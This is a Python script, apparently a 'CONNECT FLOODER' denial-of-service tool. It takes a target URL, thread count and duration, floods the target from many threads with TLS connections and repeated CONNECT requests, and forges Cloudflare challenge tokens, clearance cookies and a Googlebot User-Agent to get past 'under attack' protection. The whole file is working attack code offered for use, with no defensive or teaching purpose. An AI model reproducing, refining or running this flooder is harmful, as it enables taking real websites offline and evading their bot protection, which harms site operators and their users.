import socket,ssl,threading,struct,datetime,random
from MODEL.data import get_target,gen_id,generate_url_path

def datetime_to_epoch():
    date_string = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    date_obj = datetime.datetime.strptime(date_string, "%Y-%m-%d %H:%M:%S")
    return int(date_obj.timestamp())

def CONNECT_SEND(s,byt,target):
   for _ in range(2500):
    try:
     for _ in range(250):
       s.sendall(byt); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     s.shutdown(socket.SHUT_RDWR); s.close()
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port'])))
     s = ssl.SSLContext().wrap_socket(s,server_hostname=target['host'])
    except:pass

def CONNECT(target,duration_sec_attack_dude,byt):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            for _ in range(500):
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
             threading.Thread(target=CONNECT_SEND,args=(ssl.SSLContext().wrap_socket(s,server_hostname=target['host']),byt,target)).start()
        except Exception as e:
           print(e)
           pass
import sys
url = ''
time_booter = 0
thread_lower = 0
mode_uam = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   mode_uam = int(sys.argv[4])
else:
 print(f'WELCOME TO CONNECT FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <UAM>')
target = get_target(url)
link = ''
string_abc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
if mode_uam == 0:
   link = url
else:
   link = 'https://'+url.replace('https://','').replace('http://','').replace('/','')+f"/?__cf_chl_tk={generate_url_path(string=string_abc+'_',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=4)}"
byt = f"CONNECT {target['host']} HTTP/1.1\nHost: {target['host']}\nReferer: {link}\r\nCookie: __cf_bm={generate_url_path(string=string_abc+'_',num=random.randint(1,18))}.{generate_url_path(string=string_abc,num=random.randint(1,24))}-{datetime_to_epoch()}-{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,84))}; _ga_{generate_url_path(string=string_abc,num=4)}=GS1.1.{datetime_to_epoch()}.4.1.{datetime_to_epoch()}.0.0.0; _gid=GA1.2.{generate_url_path(string='0123456789',num=9)}.{datetime_to_epoch()}; __cfduid={generate_url_path(string='abcdefghijklmnopqrstuvwxyz0123456789',num=43)}; cf_clearance={generate_url_path(string=string_abc,num=random.randint(1,21))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,21))}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,61))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,22))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,85))}; PHPSESSID={gen_id(15)}; _ym_uid={generate_url_path(string='0123456789',num=19)}; _ym_d={generate_url_path(string='0123456789',num=10)}; _ym_isad={generate_url_path(string='0123456789',num=1)}; \r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\nConnection: keep-alive, upgrade\r\nKeep-Alive: timeout=1, max=65535\r\nUpgrade: HTTP/1.0, HTTP/2, HTTP/3, HTTPS\n\n\r\r".encode()
for _ in range(int(thread_lower)):
   for _ in range(10):threading.Thread(target=CONNECT,args=(target,time_booter,byt)).start()